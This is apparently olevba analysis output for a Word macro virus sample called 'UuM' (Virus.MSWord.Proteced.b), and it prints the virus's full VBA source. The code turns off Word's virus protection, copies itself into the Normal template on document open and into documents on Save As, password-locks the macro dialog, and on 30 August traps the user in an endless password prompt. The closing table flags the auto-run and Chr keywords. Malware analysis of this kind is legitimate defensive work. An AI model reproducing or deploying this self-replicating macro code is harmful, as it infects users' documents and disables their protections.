olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proteced.b-47e2f32e9ee00dcc4a2d695dd8c7fe3f5875fc49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proteced.b-47e2f32e9ee00dcc4a2d695dd8c7fe3f5875fc49 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Proteced.b-47e2f32e9ee00dcc4a2d695dd8c7fe3f5875fc49 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()

Options.VirusProtection = False

End Sub

Sub AutoOpen()

On Error GoTo err
Options.SaveNormalPrompt = False
DocumentToNormal
NormalTemplate.Save
err:

End Sub

Sub FileSaveAs()

Application.EnableCancelKey = wdCancelDisabled
Trigger
On Error GoTo err
   NormalToDocument
   Dialogs(wdDialogFileSaveAs).Show
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub ToolsMacro()
   
Application.EnableCancelKey = wdCancelDisabled
   titles = "Macro Proteced"
   msg = "Please enter correct password in order to access the macro:"
   Passcode = InputBox(msg, titles)
   If Passcode = "Bad Logic" Then
      Dialogs(wdDialogToolsMacro).Show
   Else
      MsgBox ("Access denied...")
   End If
Application.EnableCancelKey = wdCancelDisabled
   
End Sub

Sub NormalToDocument()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "UuM"
   Application.OrganizerCopy Source:=global_temp, _
   Destination:=cur_doc, Name:=macroname, _
   Object:=wdOrganizerObjectProjectItems
err:

End Sub

Sub DocumentToNormal()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "UuM"
   Application.OrganizerCopy Source:=cur_doc, _
                             Destination:=global_temp, _
                             Name:=macroname, _
                             Object:=wdOrganizerObjectProjectItems
err:
   
End Sub

Sub Trigger()

On Error GoTo err
   Todaydate = Date
   If (Month(Todaydate) = 8) And (Day(Todaydate) = 30) Then
       Do
         cr = Chr(13) + Chr(10)
         titles = "UuM"
         msg1 = "You are lucky!!! You have met UuM!!!" + cr
         msg2 = "UuM is Malaysian's first MACRO VIRUS." + cr
         msg3 = "It is written by a young college student -- AnGeL." + cr
         msg4 = cr + cr + cr + cr + "Please ENTER CORRECT password: "
         msg = msg1 + msg2 + msg3 + msg4
         response = InputBox(msg, titles)
       Loop While (response <> "UuM")
    End If
err:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

